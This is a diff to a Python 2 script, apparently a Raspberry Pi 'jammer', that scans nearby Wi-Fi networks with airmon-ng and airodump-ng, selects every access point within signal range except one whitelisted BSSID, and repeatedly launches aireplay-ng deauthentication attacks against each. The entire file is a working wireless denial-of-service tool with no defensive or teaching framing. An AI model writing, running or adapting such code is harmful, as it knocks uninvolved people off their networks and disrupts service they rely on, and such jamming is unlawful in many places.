@@ -3,6 +3,7 @@ import csv
 import os 
 import time
 import pprint
+from signal import SIGTERM
 
 #OLD FILES REMOVE
 def delairodumpfiles(path):
@@ -11,30 +12,91 @@ def delairodumpfiles(path):
     delfile(path + '-01.csv')
     delfile(path + '-01.kismet.csv')
     delfile(path + '-01.kismet.netxml')
-
+    time.sleep(0.5)
 def delfile(path):
     try:
         os.remove(path)
     except OSError:
         pass
+
+def send_interrupt(process):
+  
+         os.kill(process.pid, SIGTERM)
+
+
 path='/home/pi/jammer'
-delairodumpfiles('/home/pi/jammer')
-monmode=['airmon-ng','start','wlan1']
-dump=['airodump-ng','-a','-w','/home/pi/jammer','wlan1mon']
+iface=raw_input('setiface(wlan(X))')
+monmode=['airmon-ng','start',iface]
+dump=['airodump-ng','-a','-w','/home/pi/jammer',iface+'mon']
 monproc=Popen(monmode)
 monproc.wait()
 startofscan=time.time()
+delairodumpfiles('/home/pi/jammer')
 dumpproc=Popen(dump)
 while dumpproc.poll()==None:
     time.sleep(0.5)
     if((time.time()-startofscan)>10):
-        dumpproc.kill()
-dumpfile=open(path + '-01.csv','r')
+        send_interrupt(dumpproc)
 dumptable=[]
-for row in csv.reader(dumpfile):
-    dumptable.append(row)
-
-#dumptable=[row for row in csv.reader(dumpfile)]
-dumpfile.close()
-pprint.pprint(dumptable)
+with open(path + '-01.csv', 'r') as csvfile:
+        dumpreader = csv.reader((line for line in csvfile), delimiter=',')
+        
+        for row in dumpreader:
+            if len(row) < 2:
+                    continue
+            if len(row) < 14:
+                    continue
+            if row[0].strip() == 'BSSID':
+                    continue
+            if row[0].strip() == 'Station MAC':
+                    stopper = True
+                    break
+            dumptable.append(row)
+for r in range(0,len(dumptable)):
+    dumptable[r][8]=int(dumptable[r][8])
+    print dumptable[r][8]
+i=0
+targets=[]
+f=0    
+while i<len(dumptable):
+    targets.append([0]*2)
+    if dumptable[i][8]<=-80:#RANGE
+            f=f+1
+            i=i+1
+            continue
+    pprint.pprint(dumptable[i][0])
+    targets[i-f][0]=dumptable[i][0]
+    targets[i-f][1]=dumptable[i][3]
+    #pprint.pprint(targets)
+    i=i+1
+pprint.pprint(targets)
+time.sleep(3)
+target=0
+for r in range(0,5):
+    target=0
+    while target<len(targets):
+        if targets[target][0]=='14:DA:E9:80:8C:3C':#WHITELIST
+            target=target+1
+            continue
+        if targets[target][0]==0:#stopper
+            break
+        BSSID=targets[target][0]
+        ch=targets[target][1]
+        chanfix=['airodump-ng','-a','-c',ch,iface+'mon']
+        jamm=['aireplay-ng','-0','0','-a',BSSID,iface+'mon']
+        chproc=Popen(chanfix)
+        time.sleep(0.2)
+        jamproc=Popen(jamm)
+        startofjam=time.time()
+        send_interrupt(chproc)
+        while jamproc.poll()==None:
+            time.sleep(0.5)
+            if((time.time()-startofjam)>3):
+                send_interrupt(jamproc)
+                time.sleep(0.5)
+        target=target+1
 exit()
+
+
+
+
